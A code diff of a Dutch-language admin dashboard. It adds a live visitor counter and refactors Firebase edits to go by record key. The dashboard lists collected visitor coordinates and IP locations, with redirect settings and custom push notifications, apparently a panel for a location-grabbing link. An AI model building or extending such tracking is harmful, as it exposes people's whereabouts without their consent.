@@ -30,228 +30,245 @@
             box-sizing: border-box;
         }
 
-        .location-item {
-            margin-bottom: 20px;
-            border: 1px solid #ddd;
+        /* Live bezoekers sectie */
+        .live-visitors {
+            background: rgba(255, 255, 255, 0.9);
             padding: 15px;
             border-radius: 8px;
-            background: rgba(255, 255, 255, 0.9);
-            position: relative;
+            margin-bottom: 20px;
             width: 100%;
             max-width: 800px;
             box-sizing: border-box;
-        }
-
-        /* Professionele sluitknop */
-        .close-btn {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: transparent;
-            color: #e74c3c;
-            border: none;
-            font-size: 18px;
-            cursor: pointer;
-        }
-
-        .close-btn:hover {
-            color: #c0392b;
-        }
-
-        .close-btn::before {
-            content: '\2715'; /* Unicode-teken voor 'x' */
-        }
-
-        /* Schakelaar */
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 50px;
-            height: 24px;
-            margin-right: 10px;
-            vertical-align: middle;
-        }
-
-        .switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #ccc;
-            transition: .4s;
-            border-radius: 24px;
-        }
-
-        .slider::before {
-            position: absolute;
-            content: "";
-            height: 18px;
-            width: 18px;
-            left: 3px;
-            bottom: 3px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-        }
-
-        input:checked + .slider {
-            background-color: #4caf50;
-        }
-
-        input:focus + .slider {
-            box-shadow: 0 0 1px #4caf50;
-        }
-
-        input:checked + .slider::before {
-            transform: translateX(26px);
-        }
-
-        /* Algemene label stijl */
-        label {
-            font-size: 16px;
-            margin-bottom: 2px;
-            display: flex;
-            align-items: center;
-            font-weight: bold;
-        }
-
-        .edit-label {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            font-weight: bold;
-            font-size: 16px;
-            margin-top: 5px;
-            margin-bottom: 2px;
-            color: #333;
-        }
-
-        .edit-section {
-            margin-bottom: 10px;
-        }
-
-        .edit-section input {
-            width: 100%;
-            padding: 8px;
-            margin-top: 2px;
-            margin-bottom: 5px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-
-        .notification-section {
-            margin-top: 15px;
-            text-align: left;
-        }
-
-        .notification-section input[type="text"],
-        .notification-section input[type="file"] {
-            width: 100%;
-            padding: 8px;
-            margin-top: 2px;
-            margin-bottom: 5px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-
-        .notification-section img {
-            margin-top: 10px;
-        }
-
-        .notification-section button {
-            margin-top: 5px;
-            padding: 8px 15px;
-            border: none;
-            background-color: #4caf50;
-            color: white;
-            cursor: pointer;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-
-        .notification-section button:disabled {
-            background-color: #ccc;
-            cursor: not-allowed;
-        }
-
-        /* Uitlijning van schakelaars en tekst */
-        .switch-container {
-            display: flex;
-            align-items: center;
-            margin-bottom: 5px;
-        }
-
-        .switch-container label {
-            margin: 0;
-        }
-
-        .switch-text {
-            margin-left: 10px;
-            font-size: 16px;
-            color: #333;
-            font-weight: bold;
-        }
-
-        /* Bewerkbare titel */
-        .title-input {
-            width: 100%;
-            padding: 5px;
-            margin-top: 2px;
-            margin-bottom: 5px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 14px;
-            font-weight: bold;
-            box-sizing: border-box;
-        }
-
-        /* Map container */
-        .map-container {
-            width: 100%;
-            height: 200px;
-            margin-top: 10px;
-        }
-
-        /* Disclaimer */
-        .disclaimer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #fff;
             text-align: center;
         }
 
-        /* Responsive */
-        @media screen and (max-width: 480px) {
-            body {
-                padding: 10px;
+        .live-visitors h2 {
+            margin: 0 0 10px 0;
+        }
+
+        /* Locatie items */
+        .location-item {
+                margin-bottom: 20px;
+                border: 1px solid #ddd;
+                padding: 15px;
+                border-radius: 8px;
+                background: rgba(255, 255, 255, 0.9);
+                position: relative;
+                width: 100%;
+                max-width: 800px;
+                box-sizing: border-box;
             }
 
-            .switches-container {
-                padding: 10px;
+            /* Professionele sluitknop */
+            .close-btn {
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                background: transparent;
+                color: #e74c3c;
+                border: none;
+                font-size: 18px;
+                cursor: pointer;
             }
 
-            .location-item {
-                padding: 10px;
+            .close-btn:hover {
+                color: #c0392b;
             }
 
-            .edit-label, .switch-text {
+            .close-btn::before {
+                content: '\2715'; /* Unicode-teken voor 'x' */
+            }
+
+            /* Schakelaar */
+            .switch {
+                position: relative;
+                display: inline-block;
+                width: 50px;
+                height: 24px;
+                margin-right: 10px;
+                vertical-align: middle;
+            }
+
+            .switch input {
+                opacity: 0;
+                width: 0;
+                height: 0;
+            }
+
+            .slider {
+                position: absolute;
+                cursor: pointer;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background-color: #ccc;
+                transition: .4s;
+                border-radius: 24px;
+            }
+
+            .slider::before {
+                position: absolute;
+                content: "";
+                height: 18px;
+                width: 18px;
+                left: 3px;
+                bottom: 3px;
+                background-color: white;
+                transition: .4s;
+                border-radius: 50%;
+            }
+
+            input:checked + .slider {
+                background-color: #4caf50;
+            }
+
+            input:focus + .slider {
+                box-shadow: 0 0 1px #4caf50;
+            }
+
+            input:checked + .slider::before {
+                transform: translateX(26px);
+            }
+
+            /* Algemene label stijl */
+            label {
+                font-size: 16px;
+                margin-bottom: 2px;
+                display: flex;
+                align-items: center;
+                font-weight: bold;
+            }
+
+            .edit-label {
+                font-family: 'Helvetica Neue', Arial, sans-serif;
+                font-weight: bold;
+                font-size: 16px;
+                margin-top: 5px;
+                margin-bottom: 2px;
+                color: #333;
+            }
+
+            .edit-section {
+                margin-bottom: 10px;
+            }
+
+            .edit-section input {
+                width: 100%;
+                padding: 8px;
+                margin-top: 2px;
+                margin-bottom: 5px;
+                border-radius: 5px;
+                border: 1px solid #ccc;
                 font-size: 14px;
+                box-sizing: border-box;
+            }
+
+            .notification-section {
+                margin-top: 15px;
+                text-align: left;
+            }
+
+            .notification-section input[type="text"],
+            .notification-section input[type="file"] {
+                width: 100%;
+                padding: 8px;
+                margin-top: 2px;
+                margin-bottom: 5px;
+                border-radius: 5px;
+                border: 1px solid #ccc;
+                font-size: 14px;
+                box-sizing: border-box;
+            }
+
+            .notification-section img {
+                margin-top: 10px;
             }
 
             .notification-section button {
-                font-size: 12px;
+                margin-top: 5px;
+                padding: 8px 15px;
+                border: none;
+                background-color: #4caf50;
+                color: white;
+                cursor: pointer;
+                border-radius: 5px;
+                font-size: 14px;
             }
-        }
+
+            .notification-section button:disabled {
+                background-color: #ccc;
+                cursor: not-allowed;
+            }
+
+            /* Uitlijning van schakelaars en tekst */
+            .switch-container {
+                display: flex;
+                align-items: center;
+                margin-bottom: 5px;
+            }
+
+            .switch-container label {
+                margin: 0;
+            }
+
+            .switch-text {
+                margin-left: 10px;
+                font-size: 16px;
+                color: #333;
+                font-weight: bold;
+            }
+
+            /* Bewerkbare titel */
+            .title-input {
+                width: 100%;
+                padding: 5px;
+                margin-top: 2px;
+                margin-bottom: 5px;
+                border-radius: 5px;
+                border: 1px solid #ccc;
+                font-size: 14px;
+                font-weight: bold;
+                box-sizing: border-box;
+            }
+
+            /* Map container */
+            .map-container {
+                width: 100%;
+                height: 200px;
+                margin-top: 10px;
+            }
+
+            /* Disclaimer */
+            .disclaimer {
+                margin-top: 20px;
+                font-size: 12px;
+                color: #fff;
+                text-align: center;
+            }
+
+            /* Responsive */
+            @media screen and (max-width: 480px) {
+                body {
+                    padding: 10px;
+                }
+
+                .switches-container {
+                    padding: 10px;
+                }
+
+                .location-item {
+                    padding: 10px;
+                }
+
+                .edit-label, .switch-text {
+                    font-size: 14px;
+                }
+
+                .notification-section button {
+                    font-size: 12px;
+                }
+            }
     </style>
 </head>
 <body>
@@ -306,6 +323,11 @@
         </div>
     </div>
 
+    <!-- Live bezoekers sectie -->
+    <div class="live-visitors">
+        <h2>Live Bezoekers: <span id="liveVisitorsCount">0</span></h2>
+    </div>
+
     <div id="saved-locations"></div>
 
     <p class="disclaimer">Dit is een schoolproject en er wordt op geen enkele manier misbruik van gemaakt.</p>
@@ -356,6 +378,7 @@
         const redirectUrlInput = document.getElementById("redirectUrlInput");
         const redirectDelayInput = document.getElementById("redirectDelayInput");
         const saveSettingsButton = document.getElementById("saveSettingsButton");
+        const liveVisitorsCount = document.getElementById("liveVisitorsCount");
 
         // Event listener voor de knop om instellingen op te slaan
         saveSettingsButton.addEventListener("click", () => {
@@ -378,20 +401,26 @@
             });
         });
 
-        // Functie om gegevens te verwijderen op basis van locatie
-        function deleteDataItemByLocation(lat, lon) {
-            dataRef.orderByChild('lat').equalTo(lat).once('value', (snapshot) => {
-                snapshot.forEach((childSnapshot) => {
-                    const childData = childSnapshot.val();
-                    if (childData.lon === lon) {
-                        childSnapshot.ref.remove();
-                    }
+        // Functie om gegevens te verwijderen op basis van Firebase key
+        function deleteDataItemByKey(key) {
+            db.ref(`collectedData/${key}`).remove()
+                .then(() => {
+                    console.log(`Data met sleutel ${key} verwijderd.`);
+                })
+                .catch((error) => {
+                    console.error("Fout bij het verwijderen van data:", error);
                 });
-            });
         }
 
-        let displayedDataKeys = new Set();
+        // Set om unieke data keys bij te houden
+        let dataKeys = new Set();
 
+        // Live bezoekers bijwerken
+        function updateLiveVisitors(count) {
+            liveVisitorsCount.textContent = count;
+        }
+
+        // Functie om gegevens te groeperen op locatie
         function groupDataByLocation(data) {
             const groupedData = {};
 
@@ -421,7 +450,8 @@
                             notification: item.notification || {},
                             notificationSentCount: 0,
                             title: item.title || "Gegevens",
-                            ipLocation: item.ipLocation || null
+                            ipLocation: item.ipLocation || null,
+                            keys: [] // Voeg een array toe om meerdere keys te ondersteunen
                         };
                     }
                     groupedData[key].visits += 1;
@@ -434,6 +464,11 @@
                     if (item.notification && item.notification.sentCount) {
                         groupedData[key].notificationSentCount = item.notification.sentCount;
                     }
+
+                    // Voeg de unieke key toe
+                    if (item.key) {
+                        groupedData[key].keys.push(item.key);
+                    }
                 } else {
                     // Items zonder locatie kunnen hier worden afgehandeld
                 }
@@ -445,11 +480,15 @@
         function displaySavedLocations() {
             dataRef.once('value', (snapshot) => {
                 const savedData = snapshot.val() || {};
-                const dataArray = Object.values(savedData);
+                const dataArray = Object.keys(savedData).map(key => ({
+                    key: key,
+                    ...savedData[key]
+                }));
                 const container = document.getElementById("saved-locations");
 
                 if (dataArray.length === 0) {
                     container.innerHTML = "<p>Geen opgeslagen gegevens gevonden.</p>";
+                    updateLiveVisitors(0);
                     return;
                 }
 
@@ -457,8 +496,11 @@
 
                 container.innerHTML = ""; // Clear existing content
 
+                let totalVisitors = 0;
+
                 for (const key in groupedData) {
                     const dataItem = groupedData[key];
+                    totalVisitors += dataItem.visits;
 
                     const locationItem = document.createElement("div");
                     locationItem.classList.add("location-item");
@@ -466,7 +508,10 @@
 
                     const closeButton = document.createElement("button");
                     closeButton.classList.add("close-btn");
-                    closeButton.onclick = () => deleteDataItemByLocation(dataItem.lat, dataItem.lon);
+                    // Voeg een event listener toe voor elk uniek key
+                    closeButton.onclick = () => {
+                        dataItem.keys.forEach(k => deleteDataItemByKey(k));
+                    };
 
                     let htmlContent = "";
 
@@ -590,14 +635,9 @@
                     if (titleInput) {
                         titleInput.addEventListener("input", function() {
                             const newTitle = this.value;
-                            // Update title in Firebase
-                            dataRef.orderByChild('lat').equalTo(dataItem.lat).once('value', (snapshot) => {
-                                snapshot.forEach((childSnapshot) => {
-                                    const childData = childSnapshot.val();
-                                    if (childData.lon === dataItem.lon) {
-                                        childSnapshot.ref.update({ title: newTitle });
-                                    }
-                                });
+                            // Update title in Firebase voor alle keys in deze groep
+                            dataItem.keys.forEach(k => {
+                                db.ref(`collectedData/${k}`).update({ title: newTitle });
                             });
                         });
                     }
@@ -606,17 +646,9 @@
                     if (bodyTextInput) {
                         bodyTextInput.addEventListener("input", function() {
                             const newBodyText = this.value;
-                            // Update bodyText in Firebase
-                            dataRef.orderByChild('lat').equalTo(dataItem.lat).once('value', (snapshot) => {
-                                snapshot.forEach((childSnapshot) => {
-                                    const childData = childSnapshot.val();
-                                    if (childData.lon === dataItem.lon) {
-                                        if (!childData.notification) {
-                                            childSnapshot.ref.child('notification').set({});
-                                        }
-                                        childSnapshot.ref.child('notification').update({ bodyText: newBodyText });
-                                    }
-                                });
+                            // Update bodyText in Firebase voor alle keys in deze groep
+                            dataItem.keys.forEach(k => {
+                                db.ref(`collectedData/${k}/notification/bodyText`).set(newBodyText);
                             });
                         });
                     }
@@ -629,17 +661,9 @@
                                 const reader = new FileReader();
                                 reader.onloadend = function() {
                                     const iconDataUrl = reader.result;
-                                    // Update iconDataUrl in Firebase
-                                    dataRef.orderByChild('lat').equalTo(dataItem.lat).once('value', (snapshot) => {
-                                        snapshot.forEach((childSnapshot) => {
-                                            const childData = childSnapshot.val();
-                                            if (childData.lon === dataItem.lon) {
-                                                if (!childData.notification) {
-                                                    childSnapshot.ref.child('notification').set({});
-                                                }
-                                                childSnapshot.ref.child('notification').update({ iconDataUrl: iconDataUrl });
-                                            }
-                                        });
+                                    // Update iconDataUrl in Firebase voor alle keys in deze groep
+                                    dataItem.keys.forEach(k => {
+                                        db.ref(`collectedData/${k}/notification/iconDataUrl`).set(iconDataUrl);
                                     });
 
                                     // Voeg icon preview toe
@@ -661,13 +685,13 @@
                             const actionSwitch = document.getElementById(`actionSwitch-${key}`).checked;
                             let iconDataUrl = null;
 
-                            dataRef.orderByChild('lat').equalTo(dataItem.lat).once('value', (snapshot) => {
-                                snapshot.forEach((childSnapshot) => {
-                                    const childData = childSnapshot.val();
-                                    if (childData.lon === dataItem.lon && childData.notification) {
+                            dataItem.keys.forEach(k => {
+                                db.ref(`collectedData/${k}`).once('value').then(snapshot => {
+                                    const childData = snapshot.val();
+                                    if (childData && childData.notification) {
                                         iconDataUrl = childData.notification.iconDataUrl || null;
                                         let newSentCount = (childData.notification.sentCount || 0) + 1;
-                                        childSnapshot.ref.child('notification').update({ sentCount: newSentCount });
+                                        db.ref(`collectedData/${k}/notification/sentCount`).set(newSentCount);
                                         const notificationCountSpan = document.getElementById(`notificationCount-${key}`);
                                         if (notificationCountSpan) {
                                             notificationCountSpan.innerText = newSentCount;
@@ -721,6 +745,9 @@
                         Notification.requestPermission();
                     }
                 } // einde for loop
+
+                // Update live bezoekersaantal
+                updateLiveVisitors(totalVisitors);
             }); // einde dataRef.once
         } // einde displaySavedLocations
 
